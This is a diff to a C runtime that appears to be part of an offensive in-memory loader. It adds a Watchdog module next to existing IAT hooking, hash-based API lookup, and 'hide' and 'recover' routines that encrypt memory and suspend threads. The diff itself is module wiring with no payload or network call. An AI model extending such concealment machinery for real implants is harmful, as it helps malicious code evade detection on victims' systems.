@@ -25,6 +25,7 @@
 #include "win_http.h"
 #include "win_crypto.h"
 #include "sysmon.h"
+#include "watchdog.h"
 #include "shield.h"
 #include "runtime.h"
 #include "debug.h"
@@ -96,7 +97,8 @@ typedef struct {
     WinCrypto_M* WinCrypto;
 
     // reliability modules
-    Sysmon_M* Sysmon;
+    Sysmon_M*   Sysmon;
+    Watchdog_M* Watchdog;
 } Runtime;
 
 // export methods and IAT hooks about Runtime
@@ -165,6 +167,7 @@ static errno initWinFile(Runtime* runtime, Context* context);
 static errno initWinHTTP(Runtime* runtime, Context* context);
 static errno initWinCrypto(Runtime* runtime, Context* context);
 static errno initSysmon(Runtime* runtime, Context* context);
+static errno initWatchdog(Runtime* runtime, Context* context);
 static bool  initIATHooks(Runtime* runtime);
 static bool  flushInstructionCache(Runtime* runtime);
 static void  eraseArgumentStub(Runtime* runtime);
@@ -282,17 +285,6 @@ Runtime_M* InitRuntime(Runtime_Opts* opts)
     {
         errno = ERR_RUNTIME_FLUSH_INST;
     }
-    // TODO remove it
-    // start event handler
-    // if (errno == NO_ERROR)
-    // {
-    //     void* addr = GetFuncAddr(&eventHandler);
-    //     runtime->hThreadEvent = runtime->ThreadTracker->New(addr, NULL, false);
-    //     if (runtime->hThreadEvent == NULL)
-    //     {
-    //         errno = ERR_RUNTIME_START_EVENT_HANDLER;
-    //     }
-    // }
     if (errno != NO_ERROR)
     {
         cleanRuntime(runtime);
@@ -403,6 +395,14 @@ Runtime_M* InitRuntime(Runtime_Opts* opts)
     module->Procedure.GetProcByName   = GetFuncAddr(&RT_GetProcAddressByName);
     module->Procedure.GetProcByHash   = GetFuncAddr(&RT_GetProcAddressByHash);
     module->Procedure.GetProcOriginal = GetFuncAddr(&RT_GetProcAddressOriginal);
+    // sysmon
+    module->Sysmon.Status = runtime->Sysmon->GetStatus;
+    // watchdog
+    module->Watchdog.Kick       = runtime->Watchdog->Kick;
+    module->Watchdog.Enable     = runtime->Watchdog->Enable;
+    module->Watchdog.Disable    = runtime->Watchdog->Disable;
+    module->Watchdog.SetHandler = runtime->Watchdog->SetHandler;
+    module->Watchdog.Status     = runtime->Watchdog->GetStatus;
     // runtime core methods
     module->Core.Sleep   = GetFuncAddr(&RT_SleepHR);
     module->Core.Hide    = GetFuncAddr(&RT_Hide);
@@ -722,6 +722,7 @@ static errno initSubmodules(Runtime* runtime)
     module_t rel_modules[] = 
     {
         GetFuncAddr(&initSysmon),
+        GetFuncAddr(&initWatchdog),
     };
     for (int i = 0; i < arrlen(rel_modules); i++)
     {
@@ -856,6 +857,17 @@ static errno initSysmon(Runtime* runtime, Context* context)
         return GetLastErrno();
     }
     runtime->Sysmon = Sysmon;
+    return NO_ERROR;
+}
+
+static errno initWatchdog(Runtime* runtime, Context* context)
+{
+    Watchdog_M* Watchdog = InitWatchdog(context);
+    if (Watchdog == NULL)
+    {
+        return GetLastErrno();
+    }
+    runtime->Watchdog = Watchdog;
     return NO_ERROR;
 }
 
@@ -1341,6 +1353,7 @@ errno RT_lock_mods()
     typedef bool (*submodule_t)();
     submodule_t submodules[] = 
     {
+        runtime->Watchdog->Lock,
         runtime->Sysmon->Lock,
         runtime->WinHTTP->Lock,
         runtime->LibraryTracker->Lock,
@@ -1387,6 +1400,7 @@ errno RT_unlock_mods()
         runtime->InMemoryStorage->Unlock,
         runtime->WinHTTP->Unlock,
         runtime->Sysmon->Unlock,
+        runtime->Watchdog->Unlock,
     };
     errno errnos[] = 
     {
@@ -1900,6 +1914,7 @@ static errno hide(Runtime* runtime)
 {
     typedef errno (*submodule_t)();
     submodule_t submodules[] = {
+        runtime->Watchdog->Pause,
         runtime->Sysmon->Pause,
         runtime->WinHTTP->Clean,
         runtime->ThreadTracker->Suspend,
@@ -1932,6 +1947,7 @@ static errno recover(Runtime* runtime)
         runtime->ArgumentStore->Decrypt,
         runtime->InMemoryStorage->Decrypt,
         runtime->Sysmon->Continue,
+        runtime->Watchdog->Continue,
         runtime->ThreadTracker->Resume,
     };
     errno err = NO_ERROR;
@@ -2093,6 +2109,10 @@ errno RT_GetMetrics(Runtime_Metrics* metrics)
     {
         errno = ERR_RUNTIME_GET_STATUS_SYSMON;
     }
+    if (!runtime->Watchdog->GetStatus(&metrics->Watchdog))
+    {
+        errno = ERR_RUNTIME_GET_STATUS_WATCHDOG;
+    }
 
     if (!rt_unlock())
     {
@@ -2184,6 +2204,9 @@ errno RT_Exit()
     typedef errno (*submodule_t)();
     submodule_t submodules[] = 
     {
+        // stop watchdog
+        runtime->Watchdog->Stop,
+
         // stop system monitor
         runtime->Sysmon->Stop,
 
